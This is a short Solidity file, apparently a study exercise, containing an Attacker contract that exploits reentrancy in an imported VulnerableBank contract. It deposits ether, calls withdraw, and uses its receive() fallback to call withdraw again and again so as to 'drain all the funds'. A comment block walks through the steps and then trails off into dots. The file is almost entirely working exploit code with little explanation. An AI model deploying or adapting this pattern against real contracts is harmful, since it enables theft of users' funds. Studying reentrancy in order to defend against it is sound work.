pragma solidity ^0.8.20;

import "./reenter-2.sol";

contract Attacker{

    VulnerableBank bank;
    uint256 public amountAttack;

    constructor(address _bank){
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        amountAttack = msg.value; // minimal or max out our balance?
        /* 1 ether deposit by attacker
        bank balance has 10000 ether   */
        bank.deposit{value: amountAttack}();
        bank.withdraw();
    }

    receive() external payable{
        //enter the bank contract and drain all the funds
        if (address(bank).balance >= amountAttack){
            bank.withdraw();
        }

    }


}





/* Step - 1

Attacker > Call deposit() with minimal ether = 1 ether
balances[msg.sender] = 0
deposit() > 1 ether
balances[msg.sender] = 1

Step -2
withdraw()

amount = 1 ether

Step -3

ETh is sent to the caller(msg.sender) via an external call
> control will be transferred to the caller > msg.sender
.
.
..
..
..
....


Step -
balance[msg.sender] = 0

*/

